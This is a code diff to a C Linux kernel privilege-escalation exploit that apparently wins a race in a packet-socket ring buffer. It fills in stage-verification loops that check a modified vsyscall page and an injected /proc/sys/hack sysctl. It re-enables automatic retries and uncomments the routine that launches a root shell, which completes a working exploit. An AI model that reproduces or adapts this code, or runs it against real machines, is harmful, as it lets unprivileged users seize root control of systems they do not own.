@@ -390,7 +390,7 @@ int try_exploit(unsigned long func, unsigned long arg, void *verification_func)
 
     else {
         fprintf(stderr,"race not won\n");
-        exit(2);
+        exit(0);
     }
 
     munmap(pbd, tp.tp_block_size * tp.tp_block_nr);
@@ -450,12 +450,52 @@ void *modify_vsyscall(void *arg)
 
 void verify_stage1(void)
 {
-    exit(0);
+    int x;
+    pthread_t v_thread;
+
+    sleep(5);
+
+    for(x=0; x<300; x++) {
+
+        pthread_create(&v_thread, NULL, modify_vsyscall, 0);
+
+        pthread_join(v_thread, NULL);
+
+        if(verification_result == 1) {
+            exit(0);
+        }
+
+        write(2,".",1);
+        sleep(1);
+    }
+
+    printf("could not modify vsyscall\n");
+
+    exit(1);
 }
 
 void verify_stage2(void)
 {
-    exit(0);
+    int x;
+    struct stat b;
+
+    sleep(5);
+
+    for(x=0; x<300; x++) {
+
+        if(stat("/proc/sys/hack",&b) == 0) {
+            fprintf(stderr,"\nsysctl added!\n");
+            exit(0);
+        }
+
+        write(2,".",1);
+        sleep(1);
+    }
+
+    printf("could not add sysctl\n");
+    exit(1);
+
+
 }
 
 void exploit(unsigned long func, unsigned long arg, void *verification_func)
@@ -480,7 +520,7 @@ retry:
         printf("retrying stage..\n");
         kill(pid, 9);
         sleep(2);
-        //goto retry;
+        goto retry;
     }
 
     else if(WEXITSTATUS(status) != 0) {
@@ -522,7 +562,8 @@ void wrapper(void)
     c->maxlen=256;
     c->extra1 = (void *)(VSYSCALL+0xe00);
     c->extra2 = (void *)(VSYSCALL+0xd00);
-
+    printf("stage 2 start\n");
+    
     exploit(off->register_sysctl_table, VSYSCALL+0x850, verify_stage2);
 
     printf("stage 2 completed\n");
@@ -535,7 +576,7 @@ void launch_rootshell(void)
     struct stat s;
 
 
-/*    fd = open("/proc/sys/hack",O_WRONLY);
+    fd = open("/proc/sys/hack",O_WRONLY);
 
     if(fd == -1) {
         fprintf(stderr,"could not open /proc/sys/hack\n");
@@ -560,7 +601,7 @@ void launch_rootshell(void)
 
     else
         printf("could not create rootshell\n");
-*/
+
 
 }
 
